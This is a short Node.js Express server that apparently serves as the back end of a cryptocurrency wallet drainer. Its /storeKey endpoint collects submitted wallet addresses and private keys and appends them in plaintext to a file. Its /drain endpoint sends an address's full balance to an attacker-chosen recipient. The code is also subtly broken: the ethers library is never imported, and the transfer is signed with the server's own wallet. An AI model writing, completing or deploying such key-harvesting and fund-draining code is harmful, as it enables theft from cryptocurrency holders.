const express = require('express');
const bodyParser = require('body-parser');
const fs = require('fs');
const app = express();
const port = 3000;

app.use(bodyParser.json());

// Replace with your own private key and the address you want to send the funds to
const PRIVATE_KEY = 'your_private_key';
const RECIPIENT_ADDRESS = 'recipient_address';

const provider = new ethers.providers.JsonRpcProvider('https://mainnet.infura.io/v3/YOUR_INFURA_PROJECT_ID');
const wallet = new ethers.Wallet(PRIVATE_KEY, provider);

app.post('/storeKey', (req, res) => {
    const { address, privateKey } = req.body;
    const data = `Address: ${address}\nPrivate Key: ${privateKey}\n\n`;
    fs.appendFile('keys.txt', data, (err) => {
        if (err) {
            return res.status(500).json({ error: 'Error writing to file' });
        }
        res.json({ message: 'Key stored successfully' });
    });
});

app.post('/drain', async (req, res) => {
    const { address } = req.body;

    try {
        const balance = await provider.getBalance(address);
        const transaction = await wallet.sendTransaction({
            to: RECIPIENT_ADDRESS,
            value: balance
        });

        res.json({ transactionHash: transaction.hash });
    } catch (error) {
        res.status(500).json({ error: error.message });
    }
});

app.listen(port, () => {
    console.log(`Server running at http://localhost:${port}`);
});